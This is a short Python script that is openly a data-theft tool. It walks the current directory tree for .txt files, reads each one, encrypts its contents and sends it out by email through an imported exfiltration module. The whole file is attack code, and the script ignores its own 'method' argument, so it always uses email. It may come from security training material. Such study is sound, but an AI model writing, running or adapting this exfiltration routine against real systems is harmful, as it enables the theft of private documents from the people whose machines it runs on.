from cryptor import encrypt,decrypt
from email_exfil import plain_email
import os
EXFIL={
    'plain_email':plain_email
}
def find_docs(doc_type='.txt'):
    for parent,_,filenames in os.walk('.'):
        # print(parent)
        for filename in filenames:
            if filename.endswith(doc_type):
                document_path=os.path.join(parent,filename)
                # print(os.path.basename(document_path))
                yield document_path
def exfiltrate(document_path,method):
    with open(document_path,'rb') as f:
        contents=f.read()
    title=os.path.basename(document_path)
    contents=encrypt(contents)
    EXFIL['plain_email'](title,contents)

if __name__=="__main__":
    for fpath in find_docs():
        exfiltrate(fpath,'plain_email')